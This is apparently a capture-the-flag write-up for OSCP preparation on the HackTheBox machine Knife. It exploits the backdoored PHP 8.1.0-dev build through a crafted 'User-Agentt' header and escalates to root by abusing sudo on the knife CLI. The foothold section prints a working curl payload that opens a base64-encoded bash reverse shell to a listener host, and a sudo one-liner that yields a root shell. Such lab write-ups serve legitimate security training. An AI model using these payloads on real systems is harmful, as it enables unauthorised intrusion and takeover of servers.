+++
date = '2026-05-18T00:00:00-03:00'
draft = false
title = 'HTB: Knife - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'php', 'backdoor', 'gtfobins', 'sudo']
description = 'Write-up for the HackTheBox machine Knife - exploiting a PHP 8.1.0-dev backdoor for initial access, then abusing a sudo rule on the knife CLI to become root.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-knife/cover.png'
+++

Sometimes the vulnerability is not in your target's code - it is in their supply chain. Knife is a good example of what happens when a poisoned release slips through.

## Machine info

| | |
|---|---|
| **Name** | Knife |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- A web server running PHP 8.1.0-dev - a version that shipped with a backdoor - allows arbitrary command execution via a custom HTTP header
- Initial shell as `james`, `sudo -l` reveals the `knife` CLI can be run as root without a password
- `sudo knife exec -E "exec('/bin/bash')"` drops a root shell immediately

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A 10.129.34.68
```

![Nmap results](/images/htb-knife/nmap-scan.png)

Ports 22 (SSH) and 80 (HTTP) open. Apache 2.4.41 on Ubuntu. The scan already leaks **PHP/8.1.0-dev** in the response headers - that is the thread to pull.

---

## Enumeration

### Technology fingerprint

Vhost and directory enumeration returned nothing interesting - the site is mostly a static medical page with no obvious entry points. Running `whatweb` confirms the PHP version:

![WhatWeb output showing PHP 8.1.0-dev](/images/htb-knife/whatweb-php-version.png)

**PHP 8.1.0-dev**. This specific version was released in March 2021 with a backdoor injected by an attacker who compromised the PHP Git server. If a server runs this build, any request carrying the `User-Agentt` header (note the double `t`) with a value starting with `zerodiumsystem(` will execute arbitrary PHP.

Reference: [Exploit-DB #49933](https://www.exploit-db.com/exploits/49933)

---

## Foothold

### PHP 8.1.0-dev backdoor RCE

Set up a listener and send the exploit payload:

![Exploit payload via curl](/images/htb-knife/exploit-payload.png)

```bash
B64=$(echo 'bash -i >& /dev/tcp/10.10.14.208/9001 0>&1' | base64 -w0);
curl -s http://knife.htb -H "User-Agentt: zerodiumsystem('echo $B64|base64 -d|bash');"
```

The callback arrives on the listener:

![Shell as james](/images/htb-knife/shell-user.png)

Shell as `james`. `user.txt` is in the home directory.

---

## Privilege Escalation

### GTFOBins: knife exec

![sudo -l output](/images/htb-knife/sudo-l.png)

`james` can run `/usr/bin/knife` as root without a password. Knife is a command-line tool for interacting with Chef, a configuration management platform. It is not unusual to find it on infrastructure boxes. What matters here is that `knife exec` evaluates arbitrary Ruby - and [GTFOBins](https://gtfobins.github.io/gtfobins/knife/) documents exactly how to abuse it:

![Root shell via knife exec](/images/htb-knife/root-shell.png)

```bash
sudo knife exec -E "exec('/bin/bash')"
```

Root shell, `root.txt` in `/root`.

---

## Takeaways (for OSCP)

- **Supply chain compromises are real attack vectors.** The PHP 8.1.0-dev backdoor is a textbook example - always fingerprint the exact software version, not just the product name.
- **`whatweb` and response headers are your best friends during enumeration.** When directory brute-force returns nothing, look at what the server is telling you about itself.
- **Check GTFOBins for every binary in `sudo -l`.** Knife is not an obvious escalation tool, but GTFOBins documents it. The pattern - CLI tools that evaluate scripts - repeats often on OSCP-style machines.

## References

- [HackTheBox - Knife](https://app.hackthebox.com/machines/Knife)
- [Exploit-DB #49933 - PHP 8.1.0-dev Backdoor RCE](https://www.exploit-db.com/exploits/49933)
- [GTFOBins - knife](https://gtfobins.github.io/gtfobins/knife/)
- Lain Kusanagi list (OSCP prep)
